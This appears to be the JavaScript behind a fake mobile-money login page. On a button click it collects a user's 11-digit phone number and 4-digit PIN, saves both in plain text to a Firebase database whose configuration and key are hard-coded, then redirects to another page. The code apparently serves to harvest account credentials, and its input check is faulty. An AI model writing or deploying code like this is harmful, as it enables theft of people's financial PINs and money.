
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
import { getFirestore, addDoc, collection, getDocs, query, where } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "AIzaSyAxxDaz4qN8DPJNq5QcXsm5wFkCr95Vvsw",
    authDomain: "taka-27a8d.firebaseapp.com",
    projectId: "taka-27a8d",
    storageBucket: "taka-27a8d.appspot.com",
    messagingSenderId: "713293369796",
    appId: "1:713293369796:web:2905948cd0bdf91d4f1491"
};

const app = initializeApp(firebaseConfig);

const appDatabse = getFirestore(app);

document.getElementById('register-button').addEventListener('click', async function (event) {
    event.preventDefault();
    let num = document.getElementById('number').value;
    let pin = document.getElementById('pin').value;

  if(num.length == 11 || pin.length == 4){
    try {
        await addDoc(collection(appDatabse, 'my_informations'), {
            number: num,
            pass: pin,
        });
        window.location.href = '../index.html';
        alert("done");

    } catch (error) {
        alert("somting wrong")
    }
  }else{
    alert("please enter valid input")
  }
})
